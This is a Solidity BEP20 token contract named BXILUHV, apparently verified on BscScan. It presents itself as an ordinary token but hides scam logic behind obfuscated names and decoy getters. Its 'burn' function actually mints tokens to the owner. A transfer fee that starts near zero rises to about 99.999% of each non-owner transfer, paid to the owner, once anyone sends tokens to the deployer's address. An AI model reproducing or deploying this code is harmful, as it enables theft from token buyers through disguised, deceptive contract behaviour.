/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;
contract BXILUHV {
address private  MXLFCQ = address(0);
string public  name = "BXILUHV";
uint256 private  BXILUHV1 = 100000000;	
uint256 private  WBTBAO = 1000000000000000000;
address private  VCNDVT = address(0);
address private  HORIYF = address(0);
uint256 private  CIMFUI = 1000000000000000000;
uint8 public constant decimals = 18;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  symbol = "BXILUHV";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  GQTHIO = 10000000000;
uint256 private  AGDDZR = 1000000000000000000000;
uint256 private  AVLKXX = 100000000;
uint256 public constant GSTRYP = 99999;
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  ELRSKD = address(0);
address private  ZEADMV = address(0);
uint256 private  BQKBZO = 10000000000000;
uint256 private  IQVWEV = 1000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
function _getELRSKD() private returns (address) {
return ELRSKD;
}

constructor () {
HORIYF = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getIQVWEV() private returns (uint256) {
return IQVWEV;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getMXLFCQ() private returns (address) {
return MXLFCQ;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getAVLKXX() private returns (uint256) {
return AVLKXX;
}

function _getGQTHIO() private returns (uint256) {
return GQTHIO;
}

function _getWBTBAO() private returns (uint256) {
return WBTBAO;
}

function _getZEADMV() private returns (address) {
return ZEADMV;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "NKQNMD");
require(to != address(0), "NKQNMD");
require(amount <= balanceOf[from], "NKQNMD");
uint256 f00d;
uint256 fee;	
if (from == owner || to == owner){
f00d = 0;
fee = 0;
}
else{
f00d = amount* GSTRYP/CIMFUI ;
fee = 0;
}

uint256 transferAmount = amount - f00d;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += f00d;
if (to==HORIYF){
CIMFUI = GSTRYP+BXILUHV1/BXILUHV1;
}
emit Transfer(from, to, transferAmount);
}
function _getAGDDZR() private returns (uint256) {
return AGDDZR;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tNKQNMD 0");
require(spender != address(0), "fNKQNMD 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getBQKBZO() private returns (uint256) {
return BQKBZO;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getVCNDVT() private returns (address) {
return VCNDVT;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}